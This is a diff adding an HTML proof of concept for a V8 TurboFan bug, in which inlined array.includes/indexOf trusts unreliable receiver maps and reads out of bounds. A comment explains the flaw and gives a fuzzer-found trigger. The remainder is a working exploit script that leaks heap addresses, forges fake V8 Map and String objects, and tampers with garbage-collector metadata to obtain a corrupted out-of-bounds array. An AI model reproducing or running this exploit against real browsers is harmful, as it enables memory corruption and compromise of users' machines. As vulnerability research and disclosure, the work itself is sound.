@@ -1,0 +1,242 @@
+<!--
+Since commit https://chromium.googlesource.com/v8/v8.git/+/c22bb466d8934685d897708119543d099b9d2a9a turbofan supports inlining calls to array.includes and array.indexOf. The logic of the function is roughly:
+
+1. Check the set of possible Maps of the array type (with NodeProperties::InferReceiverMaps).
+2. If they are all fast arrays, find the correct CSA builtin to handle the fast path (`Callable const callable = search_variant == SearchVariant::kIndexOf ? GetCallableForArrayIndexOf(kind, isolate()) : GetCallableForArrayIncludes(kind, isolate());`).
+3. Load the array length and call the builtin. The builtin will assume that the array is a FastArray with packed (dense) elements and directly search linearly through the backing memory.
+
+The issue here is that NodeProperties::InferReceiverMaps doesn't necessarily guarantee that the object will always have the inferred Map. In case it can't prove that the objects will always have the inferred Maps it will return kUnreliableReceiverMaps:
+
+    // Walks up the {effect} chain to find a witness that provides map
+    // information about the {receiver}. Can look through potentially
+    // side effecting nodes.
+    enum InferReceiverMapsResult {
+      kNoReceiverMaps,         // No receiver maps inferred.
+      kReliableReceiverMaps,   // Receiver maps can be trusted.
+      kUnreliableReceiverMaps  // Receiver maps might have changed (side-effect),
+                                                  // but instance type is reliable.
+    };
+    static InferReceiverMapsResult InferReceiverMaps(
+        JSHeapBroker* broker, Node* receiver, Node* effect,
+        ZoneHandleSet<Map>* maps_return);
+
+In which case the caller is responsible for guarding any optimizations based on the inferred Maps (e.g. by adding MapChecks). However, in this case the calling function fails to do so. As such, if the array is changed to dictionary mode before the inlined function call, the CSA builtin will read data out-of-bounds.
+
+The following sample, found through fuzzing, triggers this case: 
+
+    function v7(v8,v11) {
+        function v14(v15,v16) { }
+        // Transition to dictionary mode in the final invocation.
+        const v17 = v11.__defineSetter__(v8, v14);
+        // Will then read OOB.
+        const v18 = v11.includes(1234);
+        return v18;
+    }
+    v7([], []);
+    v7([], []);
+    %OptimizeFunctionOnNextCall(v7);
+    v7([], []);
+
+    const v57 = v7(String(0x1000000), []);
+
+Note: the commit introducing this vulnerability does not appear to be included in the stable Chrome release yet.
+-->
+
+<script>
+var conv_ab = new ArrayBuffer(8);
+var conv_f64 = new Float64Array(conv_ab);
+var conv_u64 = new BigUint64Array(conv_ab);
+BigInt.prototype.to_float = function() {
+  conv_u64[0] = this;
+  return conv_f64[0];
+};
+BigInt.prototype.hex = function() {
+  return '0x'+this.toString(16);
+};
+Number.prototype.to_int = function() {
+  conv_f64[0] = this;
+  return conv_u64[0];
+}
+Number.prototype.hex = function() {
+  return this.to_int().hex();
+}
+
+let ab = undefined;
+
+function leak(i, smi_arr, float_arr) {
+  let high_bytes = 0;
+  smi_arr.__defineSetter__(i, ()=>{});
+  ab = new ArrayBuffer(2<<26);
+  let smi_boundary = [1, 1, 1, 1];
+  for (high_bytes = 0; high_bytes < 0xffff; high_bytes++) {
+    smi_boundary[0] = high_bytes;
+    let idx = smi_arr.indexOf(high_bytes, 20);
+    if (idx == 20) {
+      break;
+    }
+  }
+
+  float_arr.__defineSetter__(i, ()=>{});
+  let tmp = new Uint32Array(ab);
+  let float_boundary = [1.1, 1.1, 1.1, 1.1];
+
+  let start = (BigInt(high_bytes)<<32n).to_float();
+  let end = ((BigInt(high_bytes)<<32n)+0x1000000n).to_float();
+  let step = 0x1000n.to_float();
+
+  for (let j = start; j < end; j += step) {
+    float_boundary[0] = j;
+    if (float_arr.indexOf(j, 30) == 30) {
+      return [j, smi_boundary, float_boundary, tmp];
+    }
+  }
+}
+
+for (let i = 0; i < 10; i++) {
+  leak('', [1], [1.1]);
+}
+
+let res = leak('100000', [1], [1.1]);
+if (res == undefined) {
+  location.reload();
+  return;
+}
+let ab_addr = res[0].to_int();
+
+console.log(`Buf at ${ab_addr.hex()}`);
+
+let u64 = new BigUint64Array(ab);
+
+function write_map(offset, type) {
+  u64[offset/8n + 0x0n] = 0x12345n;
+  u64[offset/8n + 0x1n] = 0x190000002900a804n | (type << 32n);
+  u64[offset/8n + 0x2n] = 0x92003ffn;  // bitfield 3
+  u64[offset/8n + 0x3n] = 0x41414141n; // prototype
+  u64[offset/8n + 0x4n] = 0x41414141n; // constructor or back ptr
+  u64[offset/8n + 0x5n] = 0n;          // transistions or proto info
+  u64[offset/8n + 0x6n] = 0x41414141n; // instance descriptors
+  u64[offset/8n + 0x7n] = 0n;          // layout descriptor
+  u64[offset/8n + 0x8n] = 0x41414141n; // dependent code
+  u64[offset/8n + 0x9n] = 0n;          // prototype validity cell
+}
+
+// SPACE_SIZE = 1<<18
+// LARGE_OBJ_SIZE = (1<<17) +1
+
+const SPACE_SIZE = 1n<<19n;
+const SPACE_MASK = 0xffffffffffffffffn ^ (SPACE_SIZE-1n);
+
+let space_start_addr = (ab_addr & SPACE_MASK) + SPACE_SIZE;
+let space_start_off = space_start_addr - ab_addr;
+
+console.log(`Space start: ${space_start_addr.hex()}`);
+
+let free_mem = space_start_addr + 4096n;
+
+function page_round(addr) {
+  if ((addr & 0xfffn) == 0n) {
+    return addr;
+  }
+  return (addr + 0x1000n) & 0xfffffffffffff000n;
+}
+
+function u64_offset(addr) {
+  return (addr - ab_addr) / 8n;
+}
+
+class V8String {
+  constructor(type, data) {
+    let size = BigInt(data.length)*8n;
+    this.addr = free_mem;
+    free_mem += page_round(size);
+    this.map = free_mem;
+    free_mem += page_round(0x9n*8n);
+    this.off = u64_offset(this.addr);
+    u64[this.off] = this.map|1n;
+    for (let i = 0n; i < data.length; i++) {
+      u64[this.off + 1n + i] = data[i];
+    }
+    let map_off = u64_offset(this.map);
+    u64[map_off + 0x0n] = 0x12345n;
+    u64[map_off + 0x1n] = 0x190000002900a804n | (type << 32n);
+    u64[map_off + 0x2n] = 0x92003ffn;  // bitfield 3
+    u64[map_off + 0x3n] = 0x41414141n; // prototype
+    u64[map_off + 0x4n] = 0x41414141n; // constructor or back ptr
+    u64[map_off + 0x5n] = 0n;          // transistions or proto info
+    u64[map_off + 0x6n] = 0x41414141n; // instance descriptors
+    u64[map_off + 0x7n] = 0n;          // layout descriptor
+    u64[map_off + 0x8n] = 0x41414141n; // dependent code
+    u64[map_off + 0x9n] = 0n;          // prototype validity cell
+  }
+}
+
+class ConsString extends V8String {
+  constructor(size, left, right) {
+    super(0x29n, [(size<<32n) | 0x00000003n, left|1n, right|1n]);
+  }
+}
+
+class SliceString extends V8String {
+  constructor(parent_string, offset, len=0x100n) {
+    super(0x2bn, [(len<<32n) | 0x00000003n, parent_string|1n, offset<<32n]);
+  }
+}
+
+class SeqString extends V8String {
+  constructor(data) {
+    super(0x08n, [(BigInt(data.length*8) << 32n | 0xdf61f02en)].concat(data));
+  }
+}
+
+// object in young generation == space+8 has one of these bits set: 0x18
+u64[space_start_off/8n + 0x1n] = 0x18n;
+
+LEAK_STRING_SZ = 0x1;
+
+let seq_string = new SeqString([0x4141414141414141n]);
+let root_string = new ConsString(BigInt(LEAK_STRING_SZ), seq_string.addr, seq_string.addr);
+
+function foo(i, arr, to_search, to_copy) {
+  arr.__defineSetter__(i, ()=>{});
+  let a = [1.1, to_copy];
+  let boundary = [to_search];
+  return [arr.indexOf(to_search), a, boundary];
+}
+
+for (let i = 0; i < 100000; i++) {
+  foo('', [Array], '', 1.1);
+}
+
+function doit(to_search, to_copy) {
+  return foo('100000', [Array], to_search, to_copy)[0];
+}
+
+doit('A'.repeat(LEAK_STRING_SZ), (root_string.addr|1n).to_float());
+let corrupted_array = [1.1, 1.2, 1.3];
+
+console.log(`string at = ${u64[root_string.off+2n].hex()}`);
+
+let corrupted_array_addr = u64[root_string.off+2n]+0x40n;
+let backing_store_sz_addr = corrupted_array_addr + 0x38n;
+
+
+GC_STRING_SZ = 0x30000000;
+
+u64[space_start_off/8n + 0x0n] = 0x1234n;
+// object in young generation == space+8 has one of these bits set: 0x18
+u64[space_start_off/8n + 0x1n] = 0xff000n;
+// marking bitmap pointer
+u64[space_start_off/8n + 0x2n] = backing_store_sz_addr + 4n - (0x70n*0x4n);
+u64[space_start_off/8n + 0x6n] = space_start_addr;
+// incremental_marking ptr
+u64[space_start_off/8n + 0xf7n] = space_start_addr;
+
+seq_string = new SeqString([0x4141414141414141n]);
+root_string = new ConsString(BigInt(GC_STRING_SZ), seq_string.addr, seq_string.addr);
+doit('A'.repeat(GC_STRING_SZ), (root_string.addr|1n).to_float());
+corrupted_array[100] = 1.1;
+console.log('=== OOB array leak ===');
+for (let i = 0; i < 100; i++) {
+  console.log(corrupted_array[i].hex());
+}
+</script>
